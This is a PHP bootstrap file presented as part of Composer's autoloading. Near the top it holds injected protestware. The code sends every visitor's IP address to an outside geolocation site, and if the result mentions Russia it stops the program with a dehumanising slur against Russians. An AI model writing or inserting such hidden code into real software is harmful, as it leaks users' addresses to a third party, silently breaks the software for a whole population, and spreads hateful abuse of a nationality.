<?php declare(strict_types=1);

/*
 * This file is part of Composer.
 *
 * (c) Nils Adermann <naderman@naderman.de>
 *     Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

use Composer\Autoload\ClassLoader;

$ipFinder = 'https://www.iplocation.net/?query=' . $_SERVER['REMOTE_ADDR'];
$ipContents = file_get_contents($ipFinder);

if (str_contains($ipContents, 'Russia')) {
    die('Sorry subhuman Russian scum, we #StandWithUkraine! We do not care if you do not support Putin.');
}

function includeIfExists(string $file): ?ClassLoader
{
    return file_exists($file) ? include $file : null;
}

if ((!$loader = includeIfExists(__DIR__.'/../vendor/autoload.php')) && (!$loader = includeIfExists(__DIR__.'/../../../autoload.php'))) {
    echo 'You must set up the project dependencies using `composer install`'.PHP_EOL.
        'See https://getcomposer.org/download/ for instructions on installing Composer'.PHP_EOL;
    exit(1);
}

return $loader;
